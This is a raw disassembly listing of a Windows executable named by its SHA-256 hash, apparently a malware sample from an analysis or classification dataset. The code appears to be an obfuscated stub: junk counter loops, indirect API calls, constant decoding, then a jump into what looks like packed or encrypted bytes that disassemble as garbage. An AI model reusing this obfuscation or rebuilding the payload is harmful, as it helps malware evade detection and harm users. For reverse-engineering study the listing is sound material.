
04807f1b4e367a07fbfb77a147da068389b83a8c0f1b7b0aa183ae36bcfbce29.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c56
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d62
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237e2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238a9
  4012ea:	push   0x42392d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	pop    edi
  40143e:	push   ss
  40143f:	and    dl,BYTE PTR [edi+0x62]
  401442:	bound  esp,QWORD PTR [edx+0x62]
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	pop    eax
  401456:	test   DWORD PTR [edx+0x42],esi
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	pop    edx
  401505:	mov    al,ds:0x68d9c62b
  40150a:	dec    ebx
  40150b:	sub    eax,0x6d5071b6
  401510:	ror    DWORD PTR [eax],cl
  401512:	jg     0x401592
  401514:	inc    esp
  401515:	stc    
  401516:	mov    dh,0x2c
  401518:	cdq    
  401519:	pop    edi
  40151a:	adc    BYTE PTR [esi],bl
  40151c:	out    0x46,al
  40151e:	mov    BYTE PTR [ecx+0x2d],bh
  401521:	push   edi
  401522:	adc    edi,edx
  401524:	inc    esi
  401525:	clc    
  401526:	das    
  401527:	xlat   BYTE PTR ds:[ebx]
  401528:	aam    0xcb
  40152a:	cmp    BYTE PTR [ebx],dh
  40152c:	ror    ah,cl
  40152e:	xchg   ecx,eax
  40152f:	cdq    
  401530:	pop    ebx
  401531:	lods   al,BYTE PTR ds:[esi]
  401532:	mov    bh,0xea
  401534:	jp     0x401552
  401536:	pop    esi
  401537:	loope  0x401547
  401539:	popa   
  40153a:	jae    0x401566
  40153c:	fild   DWORD PTR [ebp-0x14]
  40153f:	cmp    edx,DWORD PTR [edi+0xa09ba4f]
  401545:	push   ebx
  401546:	mov    ds:0x9faf8995,al
  40154b:	pop    ebx
  40154c:	or     edi,DWORD PTR [esp+ebp*2-0x4ca57db4]
  401553:	(bad)  
  401554:	cs sahf 
  401556:	fisubr DWORD PTR ds:0xde7eb079
  40155c:	or     BYTE PTR [edx],0xa7
  40155f:	adc    BYTE PTR [edi+ebp*4],bh
  401562:	jne    0x401586
  401564:	test   al,0x35
  401566:	mov    ah,0xf9
  401568:	and    DWORD PTR [ecx],ebp
  40156a:	out    dx,al
  40156b:	out    dx,eax
  40156c:	sbb    ebx,DWORD PTR [edx-0x3f]
  40156f:	fdivr  QWORD PTR [ecx+eax*1+0x7261cf91]
  401576:	add    eax,0xc940a418
  40157b:	sti    
  40157c:	fcomp  QWORD PTR [edx-0x4cd0fc11]
  401582:	inc    ecx
  401583:	jne    0x4015d1
  401585:	mov    ebx,0x2a6f8c6a
  40158a:	xor    BYTE PTR [edx-0x68a8af62],dl
  401590:	mov    esi,0xdbfcf7b8
  401595:	inc    ecx
  401596:	retf   
  401597:	cmc    
  401598:	mov    dh,0xf2
  40159a:	push   eax
  40159b:	mov    bh,0x3f
  40159d:	int    0x6e
  40159f:	aad    0xc7
  4015a1:	loope  0x401563
  4015a3:	dec    ebp
  4015a4:	cmp    eax,0x60b2bc7f
  4015a9:	jmp    0xb4d9fce5
  4015ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015af:	daa    
  4015b0:	into   
  4015b1:	cmc    
  4015b2:	cmc    
  4015b3:	lock push cs
  4015b5:	bound  eax,QWORD PTR [ebp-0x73eb4f24]
  4015bb:	mov    bl,0xd6
  4015bd:	jmp    0xe15c800e
  4015c2:	mov    cl,0x6e
  4015c4:	xor    eax,0xe005a2da
  4015c9:	sub    al,0x6
  4015cb:	jmp    0xcab528a9
  4015d0:	fs loope 0x4015b5
  4015d3:	(bad)  
  4015d5:	arpl   WORD PTR [eax],si
  4015d7:	fwait
  4015d8:	mov    edi,0x2968d337
  4015dd:	adc    edx,esi
  4015df:	daa    
  4015e0:	mov    ah,0x3e
  4015e2:	bound  esi,QWORD PTR [esi+0x2a]
  4015e5:	push   cs
  4015e6:	iret   
  4015e7:	mov    eax,ds:0x2a76e084
  4015ec:	outs   dx,DWORD PTR ds:[esi]
  4015ed:	and    al,0xfe
  4015ef:	je     0x4015ac
  4015f1:	inc    ecx
  4015f2:	sbb    DWORD PTR [edx+0x5621befc],edx
  4015f8:	push   DWORD PTR [eax]
  4015fa:	popa   
  4015fb:	stos   BYTE PTR es:[edi],al
  4015fc:	jo     0x401645
  4015fe:	aas    
  4015ff:	mov    cl,0x49
  401601:	cmp    eax,0xbe7237c4
  401606:	mov    BYTE PTR [ebx+0x720d2198],al
  40160c:	inc    esp
  40160d:	fistp  QWORD PTR [ecx]
  40160f:	adc    dh,BYTE PTR [edx]
  401611:	add    eax,0x744ee2e1
  401616:	or     eax,0x2822dc25
  40161b:	xchg   ebx,eax
  40161c:	add    DWORD PTR [eax+0x2b],edi
  40161f:	jecxz  0x40164e
  401621:	addr16 mov eax,ds:0xe21a
  401625:	das    
  401626:	std    
  401627:	arpl   WORD PTR [esi+0x1dc180f6],si
  40162d:	xor    ah,BYTE PTR [ebp+0x20a0e370]
  401633:	in     eax,dx
  401634:	xchg   esp,eax
  401635:	addr16 in al,0x22
  401638:	pop    es
  401639:	push   edx
  40163a:	push   0x3
  40163c:	xchg   ecx,eax
  40163d:	cs add ebx,eax
  401640:	outs   dx,DWORD PTR ds:[esi]
  401641:	dec    ecx
  401642:	lds    esi,FWORD PTR [ebp-0x6ebc5891]
  401648:	pop    ecx
  401649:	mov    WORD PTR [edi],ss
  40164b:	out    0x2c,al
  40164d:	retf   
  40164e:	mov    al,ds:0x437a341b
  401653:	fldcw  WORD PTR [ecx+0x58397656]
  401659:	adc    bl,cl
  40165b:	in     al,dx
  40165c:	rol    ecx,cl
  40165e:	inc    edx
  40165f:	in     al,0x27
  401661:	push   cs
  401662:	sub    ebp,DWORD PTR [edi]
  401664:	mov    bh,0xe1
  401666:	or     al,0xfb
  401668:	nop
  401669:	clc    
  40166a:	out    0x87,al
  40166c:	jle    0x4016de
  40166e:	inc    edi
  40166f:	adc    al,bh
  401671:	inc    ebp
  401672:	int3   
  401673:	and    BYTE PTR [ecx],ah
  401675:	xchg   edi,eax
  401676:	mov    eax,ds:0xf77d55a6
  40167b:	data16 sub al,0xa9
  40167e:	cmp    al,0x1
  401680:	and    dl,BYTE PTR [eax+0x5edaba95]
  401686:	mov    edi,0xffbf2cc5
  40168b:	lods   al,BYTE PTR ds:[esi]
  40168c:	icebp  
  40168d:	popf   
  40168e:	lds    edi,FWORD PTR [eax]
  401690:	pop    esp
  401691:	out    0x58,al
  401693:	int    0xcd
  401695:	cld    
  401696:	mov    ds:0x46896eb7,al
  40169b:	mov    ebx,0xc8d6487e
  4016a0:	int    0xea
  4016a2:	pop    ss
  4016a3:	cwde   
  4016a4:	aaa    
  4016a5:	push   esi
  4016a6:	inc    ecx
  4016a7:	mov    cl,0x92
  4016a9:	call   0xf33c46be
  4016ae:	or     BYTE PTR [edx+0x473dd2fc],0xa4
  4016b5:	cmp    esi,DWORD PTR [esp+edx*2+0x5c07c6aa]
  4016bc:	out    0x29,al
  4016be:	retf   
  4016bf:	jne    0x4016ab
  4016c1:	sbb    bl,cl
  4016c3:	sub    edx,DWORD PTR [ebx+0x17fde2ba]
  4016c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ca:	xor    eax,0x654a209e
  4016cf:	mov    ds:0x6b221b3a,al
  4016d4:	ror    DWORD PTR [ebx-0x7c],1
  4016d7:	xlat   BYTE PTR ds:[ebx]
  4016d8:	jmp    0x40170e
  4016da:	rol    BYTE PTR [eax-0x58],cl
  4016dd:	adc    eax,0x81d6136c
  4016e2:	push   ecx
  4016e3:	(bad)  
  4016e4:	or     eax,0x138f7379
  4016e9:	inc    edx
  4016ea:	bnd jle 0x4016fc
  4016ed:	icebp  
  4016ee:	xchg   ebp,eax
  4016ef:	add    dh,BYTE PTR [ecx-0x55825293]
  4016f5:	push   es
  4016f6:	(bad)  
  4016f7:	lea    eax,[eax+0x39]
  4016fa:	sub    ah,BYTE PTR [ecx+eax*1-0x53]
  4016fe:	aas    
  4016ff:	dec    ebp
  401700:	enter  0xd26a,0x73
  401704:	cli    
  401705:	in     eax,dx
  401706:	test   DWORD PTR [esi],ebp
  401708:	sbb    ebx,ebx
  40170a:	push   0xda390d7
  40170f:	add    esi,DWORD PTR [esi]
  401711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401712:	nop
  401713:	xor    al,0xc4
  401715:	xchg   ebp,eax
  401716:	jne    0x401767
  401718:	sub    DWORD PTR [esi],esi
  40171a:	jno    0x4016d9
  40171c:	inc    edx
  40171d:	mov    esi,0x7afde675
  401722:	and    DWORD PTR [eax],edx
  401724:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  401726:	xchg   BYTE PTR ds:0x8eee9725,ch
  40172c:	mov    eax,ds:0xe099784
  401731:	sahf   
  401732:	fwait
  401733:	popa   
  401734:	sahf   
  401735:	cdq    
  401736:	pop    edx
  401737:	cmp    al,0x87
  401739:	cmp    eax,0x6a6484ad
  40173e:	je     0x4016f0
  401740:	les    esp,FWORD PTR [edx]
  401742:	ds call 0x446090c
  401748:	loop   0x401790
  40174a:	push   ecx
  40174b:	je     0x4016ea
  40174d:	jl     0x4017b7
  40174f:	push   edx
  401750:	add    dl,0x2f
  401753:	fwait
  401754:	inc    esp
  401755:	and    bl,BYTE PTR [edx]
  401757:	pop    ebx
  401758:	jle    0x40177d
  40175a:	adc    cl,BYTE PTR [edi+esi*4]
  40175d:	std    
  40175e:	aam    0xc5
  401760:	pop    ebx
  401761:	sti    
  401762:	xchg   ebx,eax
  401763:	jmp    0x401784
  401765:	test   eax,0xb594e3c4
  40176a:	mov    dl,0x4e
  40176c:	jle    0x4017bc
  40176e:	out    dx,eax
  40176f:	mov    ch,BYTE PTR [edx+edi*2-0x59]
  401773:	and    al,0x7d
  401775:	xor    al,0xa0
  401777:	pop    ds
  401778:	sar    DWORD PTR [eax+0x77],1
  40177b:	dec    ecx
  40177c:	push   ebx
  40177d:	dec    ebp
  40177e:	mov    DWORD PTR [ecx-0x20],ebx
  401781:	push   edx
  401782:	cld    
  401783:	sub    DWORD PTR [esi],ecx
  401785:	cdq    
  401786:	pop    eax
  401787:	test   eax,0xb5a224fa
  40178c:	add    al,0x61
  40178e:	pop    eax
  40178f:	cmp    esi,DWORD PTR [edi-0x7cd213b4]
  401795:	push   ebp
  401796:	fs jge 0x401721
  401799:	fs mov cl,0xab
  40179c:	(bad)  
  40179d:	mov    gs,WORD PTR [edx+0x5d887f6f]
  4017a3:	jle    0x40174d
  4017a5:	mov    WORD PTR [ecx+0xb],ss
  4017a8:	loop   0x4017d3
  4017aa:	mov    gs,WORD PTR fs:[esi+edx*4]
  4017ae:	adc    edi,eax
  4017b0:	test   al,0x21
  4017b2:	pusha  
  4017b3:	mov    BYTE PTR [edi+0x76],ah
  4017b6:	out    dx,eax
  4017b7:	(bad)  
  4017b8:	jnp    0x401786
  4017ba:	pushf  
  4017bb:	popf   
  4017bc:	jp     0x401755
  4017be:	pop    edx
  4017bf:	retf   
  4017c0:	stos   BYTE PTR es:[edi],al
  4017c1:	mov    ebp,0xc0a1a10a
  4017c6:	(bad)  
  4017c7:	loope  0x4017d1
  4017c9:	push   cs
  4017ca:	les    edx,FWORD PTR [ecx]
  4017cc:	sti    
  4017cd:	pop    ss
  4017ce:	add    cl,0xf1
  4017d1:	(bad)  
  4017d2:	sub    ch,BYTE PTR [eax]
  4017d4:	aaa    
  4017d5:	int3   
  4017d6:	inc    ecx
  4017d7:	jo     0x4017aa
  4017d9:	xchg   ebp,eax
  4017da:	mov    DWORD PTR ds:0x902a1e00,ebp
  4017e0:	ja     0x4017ac
  4017e2:	mov    ebp,0xd4aeb6ba
  4017e7:	das    
  4017e8:	(bad)  
  4017ea:	inc    DWORD PTR [ebp-0x77]
  4017ed:	push   cx
  4017ef:	xor    eax,0x6b0401ec
  4017f4:	pop    edi
  4017f5:	mov    BYTE PTR ds:0x3eea9ee,dh
  4017fb:	icebp  
  4017fc:	dec    DWORD PTR [edi+esi*8]
  4017ff:	inc    ebp
  401800:	mov    al,0x7a
  401802:	das    
  401803:	int    0xc3
  401805:	fisttp QWORD PTR [edi]
  401807:	xchg   edx,eax
  401808:	stc    
  401809:	and    DWORD PTR [ebp+eax*1-0x40],0x4c
  40180e:	mov    eax,DWORD PTR [edx+edi*4-0xc]
  401812:	iret   
  401813:	mov    ecx,0xe3fc50ab
  401818:	pop    esi
  401819:	mov    ch,0xf2
  40181b:	jns    0x40181b
  40181d:	jge    0x401852
  40181f:	repnz inc esp
  401821:	add    DWORD PTR [edx],esp
  401823:	mov    edx,0x1e85d3bb
  401828:	cli    
  401829:	inc    esp
  40182a:	scas   al,BYTE PTR es:[edi]
  40182b:	mov    dl,0x23
  40182d:	mov    edx,0x9461f462
  401832:	xchg   edi,eax
  401833:	fwait
  401834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401835:	in     al,dx
  401836:	ins    DWORD PTR es:[edi],dx
  401837:	scas   eax,DWORD PTR es:[edi]
  401838:	sub    al,0xfb
  40183a:	and    eax,0x9b471f9f
  40183f:	push   ebx
  401840:	div    dl
  401842:	ja     0x401852
  401844:	xor    cl,BYTE PTR [eax-0x42]
  401847:	mov    ecx,0x80789421
  40184c:	sbb    al,0xbf
  40184e:	stos   DWORD PTR es:[edi],eax
  40184f:	cmp    esp,DWORD PTR [ecx]
  401851:	xchg   esp,eax
  401852:	rol    BYTE PTR [ecx+0x60042d49],0x7
  401859:	jmp    0x77a2:0x215b57f4
  401860:	or     DWORD PTR [eax],edx
  401862:	mov    ch,0x5d
  401864:	sub    BYTE PTR [edx+0x3c39d87e],bl
  40186a:	mov    edx,0xe5905692
  40186f:	fucomip st,st(5)
  401871:	xchg   ecx,eax
  401872:	out    0x80,eax
  401874:	sbb    esp,DWORD PTR ds:0xad1c50a2
  40187a:	mov    BYTE PTR [edi+0x2c772cbc],bh
  401880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401881:	(bad)  
  401882:	xchg   edi,eax
  401883:	ret    0x8989
  401886:	sub    DWORD PTR [esi+0x78],ebp
  401889:	loop   0x401863
  40188b:	loop   0x4018fc
  40188d:	(bad)  
  40188e:	xlat   BYTE PTR ds:[ebx]
  40188f:	or     al,BYTE PTR [eax]
  401891:	rcl    ch,0xd8
  401894:	sbb    BYTE PTR [ecx+0x75],bl
  401897:	sbb    eax,edi
  401899:	pop    edi
  40189a:	mov    ds:0x96958d07,al
  40189f:	cmp    BYTE PTR [ebp-0x64553f3d],al
  4018a5:	mov    ecx,DWORD PTR [ecx+0x6d]
  4018a8:	mov    bl,0xd0
  4018aa:	dec    ebp
  4018ab:	leave  
  4018ac:	xchg   DWORD PTR [esi+0x25ab9ca9],esp
  4018b2:	ss int3 
  4018b4:	sub    dl,dh
  4018b6:	xchg   ecx,eax
  4018b7:	xchg   edx,eax
  4018b9:	mov    ebp,0xd3f778ba
  4018be:	pop    edi
  4018bf:	inc    edi
  4018c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018c1:	aad    0x36
  4018c3:	mov    eax,0x7f74cb0a
  4018c8:	and    esi,DWORD PTR [edi+edx*1]
  4018cb:	xchg   DWORD PTR [esi-0x50],edi
  4018ce:	cmc    
  4018cf:	lods   eax,DWORD PTR ds:[esi]
  4018d0:	mov    edx,0x91476b23
  4018d5:	out    dx,al
  4018d6:	arpl   di,sp
  4018d8:	call   0xcd7f:0xd8be6591
  4018df:	xor    al,0xd2
  4018e1:	cdq    
  4018e2:	adc    dh,bl
  4018e4:	dec    ebp
  4018e5:	jno    0x4018cf
  4018e7:	lahf   
  4018e8:	shr    BYTE PTR [edx-0x396cd4dc],cl
  4018ee:	stos   BYTE PTR es:[edi],al
  4018ef:	test   DWORD PTR [ecx],esi
  4018f1:	jl     0x40195c
  4018f3:	mov    eax,ds:0xe3a667d
  4018f8:	push   edi
  4018f9:	fistp  QWORD PTR [ebx]
  4018fb:	push   ds
  4018fc:	call   0x847f80b6
  401901:	inc    edi
  401902:	not    BYTE PTR [ecx]
  401904:	daa    
  401905:	pushf  
  401906:	cdq    
  401907:	repnz icebp 
  401909:	fcom   DWORD PTR [esi]
  40190b:	pop    ds
  40190c:	mov    gs,WORD PTR [ebx-0x65798b2]
  401912:	or     eax,0x7ccb9645
  401917:	and    eax,0xcf7506e3
  40191c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40191e:	or     DWORD PTR [edx],edx
  401920:	ret    0x37e0
  401923:	xchg   edi,eax
